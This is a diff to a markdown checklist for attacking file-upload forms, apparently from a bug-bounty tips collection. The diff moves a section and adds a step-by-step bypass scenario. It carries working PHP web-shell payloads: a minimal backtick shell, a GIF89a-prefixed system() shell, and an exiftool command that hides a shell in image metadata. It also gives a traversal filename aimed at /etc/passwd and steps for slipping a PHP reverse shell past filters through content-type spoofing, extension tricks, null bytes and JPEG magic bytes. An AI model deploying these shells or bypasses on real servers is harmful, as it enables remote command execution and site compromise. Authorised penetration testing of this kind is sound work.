@@ -33,6 +33,26 @@
         - `file.php#.png`
         - `file.`
         - `.html`
+    - Content-ish Bypass
+        - [ ]  Content-type validation
+            - Upload `file.php` and change the `Content-type: application/x-php` or `Content-Type : application/octet-stream` 
+            to `Content-type: image/png` or `Content-type: image/gif` or `Content-type: image/jpg`.
+        - [ ]  Content-Length validation
+            - Small PHP Shell
+
+            ```php
+            (<?=`$_GET[x]`?>)
+            ```
+
+        - [ ]  Content Bypass Shell
+            - If they check the Content. Add the text "GIF89a;" before you shell-code. ( `Content-type: image/gif` )
+
+            ```php
+            GIF89a; <?php system($_GET['cmd']); ?>
+            ```
+
+
+
     - Vulnerabilities
         - [ ]  Directory Traversal
             - Set filename `../../etc/passwd/logo.png`
@@ -119,24 +139,6 @@
             </code>
             ```
 
-    - Content-ish Bypass
-        - [ ]  Content-type validation
-            - Upload `file.php` and change the `Content-type: application/x-php` or `Content-Type : application/octet-stream` 
-            to `Content-type: image/png` or `Content-type: image/gif` or `Content-type: image/jpg`.
-        - [ ]  Content-Length validation
-            - Small PHP Shell
-
-            ```php
-            (<?=`$_GET[x]`?>)
-            ```
-
-        - [ ]  Content Bypass Shell
-            - If they check the Content. Add the text "GIF89a;" before you shell-code. ( `Content-type: image/gif` )
-
-            ```php
-            GIF89a; <?php system($_GET['cmd']); ?>
-            ```
-
     - Misc
         - [ ]  Uploading `file.js` & `file.config` (web.config)
         - [ ]  Pixel flood attack using image
@@ -150,8 +152,14 @@
             exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' pic.jpg
             ```
             
-  
+    - My Full Scanario For Bypass:
 
+        -   Just uploading .php file instead of jpg file.
+        -   Trying double extensions to bypass and upload php file pic.jpg.php or pic.php.jpg
+        -   Changing Content-type filtering i.e., changing Content-Type: txt/php to image/jpg
+        -   Tried Case sensitives — pic.PhP also tried pic.php5, pHP5.
+        -   Tried special characters to bypass pic.php%00 , pic.php%0a, pic.php%00
+        -   Basically every file extension has its own magic number, and I took a php-reverse-shell.php file and using hex editor I added the magic number of jpeg i.e., FF D8 FF E0 at start of the php file using the hex tool.
 
 ### References:
 * https://github.com/HolyBugx/HolyTips/blob/main/Checklist/File%20Upload.md
